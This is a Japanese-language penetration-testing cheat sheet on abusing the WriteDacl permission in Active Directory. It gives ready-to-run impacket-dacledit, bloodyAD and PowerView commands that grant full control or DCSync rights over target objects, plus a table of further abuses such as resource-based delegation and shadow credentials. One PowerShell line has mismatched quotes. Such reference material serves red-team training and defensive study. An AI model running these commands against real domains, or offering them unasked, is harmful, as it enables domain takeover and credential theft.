# 権限の追加

この悪用は、`WriteDacl` を持つオブジェクトを別のオブジェクトで制御するときに実行できる。

攻撃者はターゲット・オブジェクトの DACLに新しい ACE を書き込むことができる。これにより、攻撃者はターゲット・オブジェクトを完全に制御することができる。

## Linux

### impacket

以下の４つの権限の中からを選択できる

- FullControl
- ResetPassword
- WriteMembers
- DCSync

```
impacket-dacledit -action "write" -rights "FullControl" -principal "<Controlled_User>" -target "<TargetObject>" <DOMAIN>/<USERNAME>:<PASSWORD>
```

### bloodyAD

追加できる権限一覧

| computer          | 新しいコンピューターの追加                                   |
| ----------------- | ------------------------------------------------------------ |
| dcsync            | ドメインの DCSync 権限を追加する (ドメインオブジェクトを所有するか WriteDacl を持っている必要がある) |
| dnsRecord         | 新しいDNSレコードをAD環境に追加                              |
| genericAll        | フルコントロールを与える（オブジェクトを所有しているか、WriteDaclを持っている必要がある） |
| groupMember       | グループに新しいメンバー（ユーザー、グループ、コンピュータ）を追加する |
| rbcd              | リソースベースの制約委任を追加し、ターゲット上のユーザーをサービスになりすます（ターゲットの `msDS-AllowedToActOnBehalfOfOtherIdentity` の 「Write」 権限と Windows Server >= 2012 が必要） |
| shadowCredentials | Key Credentials をターゲットに追加し、追加したクレデンシャルでターゲットになりすます |
| uac               | ユーザー/コンピュータ・オブジェクトの動作を変更するプロパティ・フラグを追加する |
| user              | 新しいユーザーを追加する                                     |

完全な制御権を与える

```
bloodyAD --host <DC_IP> -d <DOMAIN> -u "<USERNAME>" -p "<PASSWORD>" add genericAll "<TargetObject>" "<Controlled_User>"
```

DCSync を付与

```
bloodyAD --host <DC_IP> -d <DOMAIN> -u "<USERNAME>" -p "<PASSWORD>" add dcsync "<Contorolled_User>"
```

## Windows

### PowerView

完全な制御権を与える

```
Add-DomainObjectAcl -Rights All -TargetIdentity "<Target_Object>" -PrincipalIdentity "<Controlled_User>"
```

#### そのユーザーとしてプロセスを実行したいない場合

PSCredential オブジェクトを作成

```
$SecPassword = ConvertTo-SecureString "<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $SecPassword)
```

完全な制御権を与える

```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "<TargetObject>" -Rights All
```

